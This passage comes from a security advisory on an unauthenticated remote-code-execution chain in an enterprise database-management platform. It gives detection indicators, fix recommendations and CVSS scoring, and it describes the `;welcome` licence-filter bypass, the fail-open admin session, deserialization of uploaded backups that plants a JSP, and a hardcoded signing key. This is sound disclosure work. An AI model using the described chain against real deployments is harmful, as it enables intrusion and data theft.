Because the impact metrics in the published score describe compromise of the product, its managed data and its
availability, they do not depend on that identity being privileged, and they do not rise if it is: a deployment
that runs the platform as root would be a worse outcome and is not what was measured.

### Reachability and impact — the window, and what the chain costs an attacker

There is no window. This is not a first-run race, a setup-mode condition or a state that closes when an
administrator logs in for the first time. The fail-open branch applies for as long as the external security
provider is unconfigured, the license-gate bypass applies for as long as the filter reads raw URIs, and the
deserialization sink applies unconditionally. The chain was fired repeatedly against the same instance with no
state consumed between runs; the only observable residue is one log line per successful hop 1 and, if cleanup is
not performed, one file in a static-asset directory.

The cost to the attacker is one crafted multipart POST and one GET, with no reconnaissance, no credential
acquisition, no timing precision, no outbound infrastructure and no target-specific adaptation. The generator
produces the carrier offline; its `--selftest` mode verifies that offline work without touching a target.

### Reachability and impact — detection notes

For a defender, the useful indicators, in decreasing order of specificity:

- Product log lines pairing the restore frame with a cast exception naming a JDK collection class where backup
  metadata was expected. This is the direct signature of a fired carrier and increments once per attempt.
- Any request target reaching this application that contains a `;` character. The product's own UI does not need
  path parameters on the administrative endpoints observed, so its appearance on `/em/database/*` or
  `/em/tdm/api/v*` is anomalous on its own.
- A non-image file under the deployed web application's `images/` directory, and any `_jsp.java` or `_jsp.class`
  under the Jasper work directory whose stem does not correspond to a page the product ships.
- Anonymous `POST` activity against the restore or backup endpoints from a client that never authenticated, and
  anonymous `200` responses from `/em/database/currentConfig` on an instance that should be reporting
  unlicensed.
- HTTP `200` responses whose JSON body carries a `status: 403` licence message - the product's own dead-code
  status write means licence refusals are invisible to status-based monitoring.

### Reachability and impact — related findings reported without a score

Several additional first-party defects were measured on the same product and are reported to the vendor
separately. They are listed here so that this document's scope is unambiguous, and none of them is folded into
the published vector:

- The generic license-gate bypass on its own, which exposes `/em/database/**` and the whole `/em/tdm/api/v*`
  tree anonymously - an authorisation bypass, not an execution.
- The fail-open remember-me branch and the authentication provider that does not verify the submitted
  password - privilege granting, not execution.
- The offline-forgeable session cookie with its literal signing key and keyless signature (CWE-321, CWE-347).
  Demonstrated where it is redundant; **not verified** in the configuration where it would matter.
- Anonymous whole-database download and anonymous backup creation through the v2 and v3 backup endpoints, the
  v2 variant being an undocumented twin of the v3 one.
- Anonymous arbitrary file read and anonymous arbitrary file delete through the temp-file handler's
  concatenation of a query parameter into a path (CWE-22), measured with an `/etc/passwd` read and with a
  deletion that really removed a prepared file.
- Anonymous creation of database files in an arbitrary directory, because the JSON connection URL is passed
  verbatim into a JDBC file URL. Measured as six new files appearing in a chosen directory. The directory and
  base name are attacker-controlled while the extension is fixed by the engine and the content is not, so this
  does not reach an execution surface - which is why it is a disclosure item and not part of the chain.
- Twenty-eight hardcoded secret values, seventeen of them security-relevant, described in the attack-surface
  section.
- A transactional-commit defect in which a malformed JSON body can leave orphaned rows, since the checked
  exception thrown by the JSON library does not mark the surrounding transaction for rollback.
- An inconsistent upload guard family: header validation applied to only two of seventeen files that set a
  content-disposition header, a zip validator that tests only the extension, and a routine named
  `canonicalize` that performs a UTF-8 round trip rather than any path canonicalisation while being relied on
  as a path guard.

## 11. Fix Recommendations

### Fix Recommendations — vendor side, ordered by root cause

1. **Install a deserialization filter and cover every call site in the class.** Set an `ObjectInputFilter`
   allow-list on the stream in `AbstractDatabaseBackup` before the first read, permitting only the backup
   metadata classes the format needs, and apply the same filter at the two sibling `readObject()` sites in the
   row-draining and row-binding routines at lines 323 and 435. A process-wide `jdk.serialFilter` in the launch
   configuration is a useful backstop but must not be the only layer, since it does not distinguish trusted
   in-process streams from uploaded ones.
2. **Retire native serialization for backup files.** The durable fix is to stop letting a file name a class. A
   schema-bearing format - protobuf, or JSON with explicit DTO classes - removes the entire gadget surface from
   this feature and makes the licence-and-version checks the only parsing work left.
3. **Reorder the restore routine so that no untrusted byte is deserialized before validation.** Connecting, or
   at minimum validating and authenticating the backup's provenance, before `readObject()` would have stopped
   this chain even with no filter at all, because the supplied configuration is designed to fail. This is the
   cheapest structural change available.
4. **Bind backups to the server that produced them.** Sign the archive, or record a server-side digest of every
   backup exported, and refuse any restore whose signature or digest is unknown. The documentation already
   assumes the file came from a same-version installation of the same product; the code should enforce that
   assumption instead of trusting it.
5. **Decide licence and authorisation on the mapped path, not the raw URI.** Strip path parameters and use the
   container's normalised servlet path or the mapping result; replace every unanchored `endsWith` exemption with
   a separator-anchored or exact match; and change the JSON-`Accept` branch that reassigns the exemption set
   with `=` into an accumulating `|=` so accepting a JSON response cannot erase the static exemption list.
6. **Fix the dead status write in the license filter.** Set the status before the output stream is flushed, or
   remove the unreachable call, so that licence refusals carry the status they describe. Today they surface as
   HTTP `200`, which defeats status-based monitoring across the product.
7. **Fail closed when no security provider is configured.** The remember-me service must not return an
   authenticated `admin` token because a configuration lookup returned null. Return no authentication, or refuse
   the request, and log a startup warning that administrative endpoints are being served without an identity
   source. Independently, make the authentication provider verify the submitted password.
8. **Replace the session signing scheme.** The remember-me key must not be a string literal compiled into a
   class shipped to every customer, and the signature must not be produced by a scheme that carries no secret.
   Use an HMAC keyed with a per-deployment random secret generated at install time and stored outside the image,
   with expiry binding to the specific user record.
9. **Stop compiling JSPs at runtime in production.** Precompile the application's own pages and disable
   development-mode compilation, or serve static image content from a location outside any JSP-mapped web
   application root. A static-asset directory that the container will compile and execute on demand is an
   execution surface in search of a write primitive, and this product now has both.
10. **Confine the temp-file handler.** Canonicalise the `fileID` parameter, apply a base-name extraction, and
    reject any value containing a separator before joining it to the temp directory. This closes the anonymous
    read and delete primitives reported alongside this chain.
11. **Centralise licence enforcement.** With 54.8 percent of routed resource classes performing any licensing
    check, enforcement is a property of individual authors' memory rather than of the architecture. Move it into
    a single interceptor over the routed resource set, with an explicit opt-out per endpoint that appears in a
    reviewed list.
12. **Remove shipped secrets.** Generate the TLS keystore per instance with a random store password, derive
    encryption keys from a deployment secret held outside the image, never use the key as the IV, and move the
    licensing decoder's literal argument out of source.
13. **Document the incident-response asymmetry.** Deletion of a dropped page and of its compiled artefacts does
    not unload a servlet. The vendor's own guidance for cleaning a compromised deployment should say that a
    context reload or restart is required, since defenders following the obvious procedure will believe they
    have remediated when they have not.

### Fix Recommendations — operator side until a patch exists

- Reject any request target containing a `;` at whatever proxy or gateway fronts the platform. This one rule
  closes the `;welcome`, `;about` and `;notlicensed` exemptions simultaneously. It needs regression testing
  against legitimate matrix-parameter use before it is enabled.
- Restrict `/em/database/**` to named management addresses, and put an authenticating reverse proxy in front of
  the administrative paths rather than relying on the product's own gates.
- Configure the external security provider. Doing so removes the fail-open branch that supplies the anonymous
  principal - with the caveat recorded above that this deployment state was not detonated end to end, so it
  should be treated as reducing exposure rather than as a proven fix.
- Monitor `webapps/em/images/` for any file that is not a static asset and the Jasper work directory for
  compiled stems the product does not ship; alert on the cast-exception log signature; and treat the presence of
  either as an active compromise indicator rather than as noise.
- Replace the shipped TLS keystore and store password on every installation, on the assumption that the shipped
  key pair is public to anyone holding the image.
- When remediating a confirmed drop, reload the context or restart the instance, then hunt for lateral movement
  from the platform's stored credentials and connection strings - the product's whole purpose is to hold
  reachable definitions of other systems.

### Fix Recommendations — a regression test the vendor should add

Three assertions would have caught all of this before release, and none of them is exotic:

- Assert that `/em/database/currentConfig` and `/em/database/currentConfig;welcome` produce the *same* licensing
  decision, and that a target whose final characters spell `welcome` but which is not the welcome page is not
  exempt. This is a direct test of interpretation agreement between the filter and the router.
- Assert that deserializing a `java.util.HashSet` - or any class outside the backup metadata allow-list - where
  backup metadata is expected fails with a filtered-class rejection, and that the failure occurs before any
  database connection attempt.
- Assert that a session cookie signed with a key material value read out of the shipped class file does not
  authenticate, which forces the signing scheme to depend on something not present in the image.

## 12. CWE and CVSS

### CWE and CVSS — classification

| Classification | Role | Where it lives |
|---|---|---|
| CWE-502 Deserialization of Untrusted Data | primary | `AbstractDatabaseBackup.java:111/:117`, plus the sibling sites at `:323` and `:435`; zero `ObjectInputFilter` product-wide |
| CWE-436 Interpretation Conflict | co-equal | `EMLicenseFilter.java:165-166` raw URI plus unanchored `endsWith`, against the container's pre-mapping path-parameter stripping; sole call site at `:47-48` |
| CWE-863 Incorrect Authorization | co-equal consequence of the above | the disabled filter also skips the `/tdm/api/v` guard at `:99` and the redirect at `:118` |
| CWE-287 Improper Authentication | enabling gate | `EMRememberMeServices.java:148` fail-open branch; `PSTAuthenticationProvider.java:144` does not verify a password |
| CWE-321 Use of Hard-coded Cryptographic Key | reported separately, not scored | the literal `"rememberMeAuthenticated"` signing key |
| CWE-347 Improper Verification of Cryptographic Signature | reported separately, not scored | a bcrypt-based session signature that carries no secret |
| CWE-22 Path Traversal | reported separately, not scored | the temp-file handler's concatenation of `fileID`; part of the write primitive's generality but not the mechanism used here |
| CWE-798 / CWE-259 family | reported separately, not scored | 28 hardcoded secret values, 17 of them security-relevant |

Not attributed to any third-party component: aspectjweaver and commons-collections4 are carriers, and the
functor-based chains usually cited against commons-collections4 are unavailable here because the shipped 4.5.0
version does not declare `InvokerTransformer` serializable. The JSP execution is the product's own container
configuration, so nothing here is a Tomcat defect. No pre-existing CVE identifier is attached to this product
for either root cause, and none is cited: the vendor's CPE axis in the national database returns zero records,
the two vendor-name keyword hits resolve to a different vendor's plugin artefacts, exploit-database and
package-advisory queries return nothing, the shipped artefacts contain no deserialization filtering, and the
vendor's own release notes for this train list only third-party library updates. One axis - a security-advisory
database with a text-search facility - could not be established because the service ignored the search
parameter, and that absence is recorded rather than presented as a clean result.

### CWE and CVSS — the published score and its arithmetic

Published: **9.8 Critical**, `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`.

Computed from the vector with the CVSS 3.1 base formula rather than inherited: impact sub-score
ISS = 1 - ((1 - 0.56) x (1 - 0.56) x (1 - 0.56)) = 0.914816; Impact for Scope Unchanged = 6.42 x 0.914816 =
5.873119; Exploitability = 8.22 x 0.85 (AV:N) x 0.77 (AC:L) x 0.85 (PR:N) x 0.85 (UI:N) = 3.887043; base =
min(5.873119 + 3.887043, 10) = 9.760161; rounded up to the nearest tenth = **9.8**.

The research notes behind this advisory recorded the same vector at the same value, so the recomputation
confirms rather than corrects the record. Each metric:

- **AV:N** - two ordinary HTTP requests to listeners the product serves over TCP, with no local access, no
  physical access and no adjacency requirement in the product's own design. The loopback publication of the
  test port was the testbed's containment, not a product restriction.
- **AC:L** - no race, no window, no host-specific reconnaissance, no memory-layout condition, no outbound
  dependency, no database reachability requirement and no cryptographic work. The only precondition is a
  configuration state that is the vendor image's own default.
- **PR:N** - no credential belonging to anyone is supplied or consumed. The authenticated principal is
  manufactured by the product for an anonymous request; the attacker contributes nothing to it.
- **UI:N** - no human action anywhere in the chain.
- **S:U** - the vulnerable component and the impacted component are one application in one JVM; see below.
- **C:H** - everything the platform manages plus everything uid 1000 can read on the host, measured by reading
  `/etc/passwd` and by disclosing the database location and user through the bypassed configuration endpoint.
- **I:H** - an arbitrary-path arbitrary-content write is a primitive of the chain, independent of what any
  command does afterwards.
- **A:H** - arbitrary code in the product JVM, which can destroy or stop the platform's own data and service.

### CWE and CVSS — Scope Changed, considered and rejected

The argument for Changed is superficially available and is worth stating so the rejection is visible: the
defect lives in a licensing filter and a backup-routine class, while the impact lands on an entirely different
subsystem - the web-application directory that Jasper compiles - and then on the operating system, which reads
like two authorities.

It is not two authorities, for three reasons. First, the filter, the deserializing controller, the security
service, the web application root and the JSP mapping all belong to one deployed application running in one
JVM; the platform is a single product with several routers, not several products. Second, executing a `.jsp`
that sits inside its own web application root is the documented, intended behaviour of the container
configuration the product ships, so the transition from write to execution crosses no boundary the product
defines. Third, the executed code carries the product process's own uid in the product process's own
filesystem view; no other account, no other machine and no other security domain is entered. Cross-account or
cross-host outcomes can justify Changed; running as the same service identity on the same host does not.

For completeness, the Scope-Changed variant of the published metrics,
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`, computes to **10.0** (ISS 0.914816, Impact for Scope Changed
6.128026, Exploitability 3.887043, 1.08 times their sum capped at the maximum). It is rejected, and it is not
published as this finding's score. Note the practical consequence of rejecting it: the difference between 9.8
and 10.0 changes no operational decision, so the honest vector is also the convenient one.

### CWE and CVSS — conditional readings, labelled as such

Three labelled readings accompany the published score. None replaces it.

**Conditional A - the external security provider is configured and the attacker holds any valid account.**
Where an operator has configured the external identity source, the fail-open branch does not apply and both
hops require a genuine authenticated subject. The security matcher for the restore path is `authenticated()`,
not `hasRole("ADMIN")`, so a low-privileged account suffices, and the license gate is still bypassed and the
sink is still unfiltered:

- `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` = **8.8** High. Exploitability = 8.22 x 0.85 x 0.77 x 0.62 x
  0.85 = 2.835255, Impact 5.873119, base 8.708373, rounded up to 8.8.

This is a deployment state we did not detonate, so it is conditional. It is also the reading an operator of a
configured deployment should work from, because it is the one that does not depend on any unverified
capability.

**Conditional B - the external security provider is configured and the subject comes from an offline-forged
session cookie.** The platform signs its remember-me cookie with a key that is a compile-time string literal and
a digest scheme that carries no secret, so a valid subject is computable offline by anyone holding the shipped
class. If that leg works in a configured deployment, the attacker again supplies no credential and the vector is
identical to the published one:

- `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = **9.8** Critical, arithmetically identical to the published
  score.

This reading is a static and structural inference and is **not verified**. Forgery was demonstrated only in the
unconfigured state, where it is redundant; the combination above was never dynamically tested; and building a
fake security provider in order to test it was deliberately abandoned, because a provider we installed would
have manufactured the evidence. It is published so that an operator of a configured deployment knows which
exposure to check and so the vendor knows which mechanism to replace, and it is never to be quoted as a
demonstrated capability or as the headline score.

**Conditional C - the listeners are reachable only from a management network.** Where an operator firewalls or
segregates the platform, the network position becomes adjacent:

- `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = **8.8** High. Exploitability = 8.22 x 0.62 x 0.77 x 0.85 x
  0.85 = 2.835255, Impact 5.873119, base 8.708373, rounded up to 8.8.

Labelled conditional on a deployment change we did not test, and downward rather than upward: it exists so an
operator who hardens the network position can see what that hardening is worth (one point of severity) and what
it does not fix (everything else).

### CWE and CVSS — what was measured over HTTP, and what rests on source reading

| Leg | Evidence class | Status |
|---|---|---|
| License gate bypass, read endpoints, HTTP | measured request/response with a no-semicolon control | measured |
| License gate bypass, read endpoints, HTTPS | measured, `200`/204 against `302`/0 | measured |
| Anonymous `admin` identity response and its `401` control | measured | measured |
| CSRF exemption for the restore path | source reading of a 28-line matcher class, corroborated by hop 1 succeeding with no token | source plus measured consequence |
| hop 1 restore POST, `500`/119 | measured | measured |
| gadget firing, file appearing, exact size and ownership | measured on the target side, not from client output | measured |
| product log success signature and its per-run increment | measured, 2 then 4 then 6 | measured |
| hop 2 anonymous GET, `200`, evaluated arithmetic, `uid=1000(parasoft)` | measured | measured |
| hop 2 `404` control in the same directory | measured | measured |
| hop 3 servlet still loaded after file deletion | measured | measured |
| FreeMarker template landing, `7*119` to `833`, `id` output | measured | measured |
| Sibling `readObject()` sites at lines 323 and 435 | source reading only | not detonated |
| Corpus-wide absence of any deserialization filter | shipped-artifact search (0 hits against an 81-file positive control) | measured on artefacts |
| JVM `--add-opens` list and the two dead classical chains | read from the process command line; one dead chain additionally confirmed by a native listener receiving no connection | measured |
| Absence of JDBC drivers among 238 jars | shipped-artifact survey | measured on artefacts |
| Bytecode-level facts about the caching map's write path | single-class disassembly | measured on artefacts |
| Behaviour of the chain where an external provider **is** configured | source reading only | not verified |
| Forged session cookie satisfying an authenticated-subject requirement | source reading plus a forgery demonstrated only in the redundant state | **not verified** |
| JavaScript-engine path reachability | capability layer measured in isolation; reachability preconditions unsatisfied | **not verified**, excluded |
| Cross-release or cross-platform applicability | documentation-level only (vendor release notes list no first-party security fix) | not measured |

### CWE and CVSS — what is deliberately not published

- **No score assumes root.** The landing identity is uid 1000 and the impact metrics describe compromise of the
  product and its data, which holds under any identity.
- **No score assumes the forged-cookie leg.** The published vector's `PR:N` rests on the measured fail-open
  behaviour of the untouched vendor image, not on any forgery.
- **No score is raised by the amplifiers.** The hardcoded secrets, the anonymous database dump, the anonymous
  arbitrary read and delete, the arbitrary-directory database-file creation, the dead status code and the
  uneven licence-check coverage are each reported to the vendor in their own right and none is folded into the
  RCE vector, which would double-count primitives the chain already carries.
- **No score is attached to the sibling sinks** at lines 323 and 435, because they were not reached; they are
  named so that a fix covers them.
- **No upstream component is blamed**, and no third-party CVE identifier is cited for this product, because
  neither root cause is in third-party code and no prior record with either root cause was found.
- **No cross-version claim is published.** One build was executed, and the `-SNAPSHOT` version scheme plus the
  mutable `latest` tag mean the build cannot be mapped onto a released version range with the confidence a
  public affected-version list requires.

### CWE and CVSS — summary

| Reading | Vector | Score | Severity | Status |
|---|---|---|---|---|
| **Published** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` | **9.8** | Critical | what the untouched vendor image permits, measured end to end |
| Conditional A | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` | 8.8 | High | provider configured, attacker holds any valid account; not detonated |
| Conditional B | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` | 9.8 | Critical | provider configured, subject from a forged cookie; **not verified**, structural inference only |
| Conditional C | `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` | 8.8 | High | listeners restricted to a management network; not tested |
| Rejected | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` | 10.0 | Critical | Scope Changed considered and rejected, see above |

One sentence for the vendor's engineers: an anonymous client can make your license filter skip itself with a
`;welcome` path parameter, receive an authenticated `admin` principal from your own remember-me service because
no security provider is configured, and have the `database.ser` member of an uploaded zip deserialized by an
`ObjectInputStream` that carries no filter anywhere in the product - which writes attacker bytes to an
attacker-chosen path, and one of the paths it can write to is a `.jsp` file inside a directory your own
`conf/web.xml` hands to Jasper, so a second anonymous GET runs it as uid 1000.
